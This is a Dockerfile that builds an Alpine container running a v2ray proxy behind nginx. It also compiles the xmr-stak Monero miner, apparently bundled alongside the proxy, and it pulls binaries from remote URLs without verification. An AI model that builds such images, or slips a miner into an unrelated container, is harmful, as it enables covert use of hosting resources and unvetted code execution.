FROM alpine:latest
ENV UUID bae4c69e-3fe3-45d4-aaae-43dc34855efc

ADD https://storage.googleapis.com/v2ray-docker/v2ray /usr/bin/v2ray/
ADD https://storage.googleapis.com/v2ray-docker/v2ctl /usr/bin/v2ray/
ADD https://storage.googleapis.com/v2ray-docker/geoip.dat /usr/bin/v2ray/
ADD https://storage.googleapis.com/v2ray-docker/geosite.dat /usr/bin/v2ray/

COPY config.json /etc/v2ray/config.json
COPY entrypoint.sh /usr/bin/

RUN echo "http://dl-cdn.alpinelinux.org/alpine/edge/testing" >> /etc/apk/repositories \
&& apk --update --no-cache add ca-certificates nginx build-base cmake git curl openssl-dev libmicrohttpd-dev hwloc-dev \
&& git clone https://github.com/fireice-uk/xmr-stak.git \
&& mkdir xmr-stak/build \
&& cd xmr-stak/build \
&& cmake -DCUDA_ENABLE=OFF -DOpenCL_ENABLE=OFF .. \
&& make install \
&& apk del --purge build-base cmake git curl \
&& mkdir /var/log/v2ray/ && \
chmod +x /usr/bin/v2ray/v2ctl && \
chmod +x /usr/bin/v2ray/v2ray
    
ENV PATH /usr/bin/v2ray:$PATH
COPY default.conf /etc/nginx/conf.d/default.conf
RUN adduser -D myuser && \
    mkdir /run/nginx
USER myuser
CMD entrypoint.sh
